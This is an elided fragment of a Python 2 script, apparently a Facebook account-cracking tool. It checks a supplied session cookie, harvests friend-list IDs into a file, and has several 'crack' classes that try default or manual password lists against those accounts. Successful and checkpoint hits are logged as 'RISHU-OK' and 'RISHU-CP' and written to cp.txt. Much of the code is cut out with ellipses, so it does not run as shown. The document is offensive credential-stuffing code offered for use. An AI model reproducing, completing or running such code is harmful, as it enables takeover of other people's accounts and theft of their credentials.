...
def gen():
	...
	try:
		...
		if lang(cks)==True:
			...
			time.sleep(1)
			menu()
		else:print("   \033[1;91m[!] Invalid Cookie").format(R,N);gen()
...
def publik():
	...
	try:
                ...
                banner()
                print ("\033[0;97m---------------------------------------------")
		print("\033[0;93m[•] Type \'me\' Friendlist ")
		...
		try:
			...
			print("  \033[0;92m [!] Return").format(N)
			publik()
		...
		ys.close()
		print ("\033[0;97m-----------------------------------------------------")
		print ('\033[0;91m[•] \033[0;92mSuccessfully  %s'%op['name'])
		print ("\033[0;91m[•] \033[0;91mTotal ID : %s\033[0;90m"%(len(id)))
		print ("\033[0;91m[•] \033[0;92mOutput   : %s\033[0;90m"%qq)
                print ("\033[0;97m-----------------------------------------------------")
...
class crack:
	...
	def __init__(self):
		...
		self.cp=[]
		self.ko=0
		print("\033[0;92m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;93m[•] choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;91m[•] ID List File : ")
					...
					print ("   %s"%e)
					continue
				print ("\033[0;91m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;92m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
				...
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;92m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print("\r   \033[0;92m[RISHU-OK]%s\033[0;92m %s • %s %s      "%(G,fl.get("id"),i,N))
					...
					print("\r \033[0;91m[RISHU-CP]%s\033[0;90m %s • %s %s     \033[0;90m "%(O,fl.get("id"),i,N))
...
class crack2:
	...
	def __init__(self):
		...
		self.cp=[]
		self.ko=0
		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;93m[•] Choose: ")
			if f=="":continue
			elif f=="m":
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					...
					print("\r \033[0;91m[RISHU-CP]%s\033[0;90m %s • %s %s    \033[0;91m  "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
...
class crack3:
	...
	def __init__(self):
		...
		self.cp=[]
		self.ko=0
		print("\033[0;93m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;93m[•] Choose: ")
			if f=="":continue
			elif f=="m":
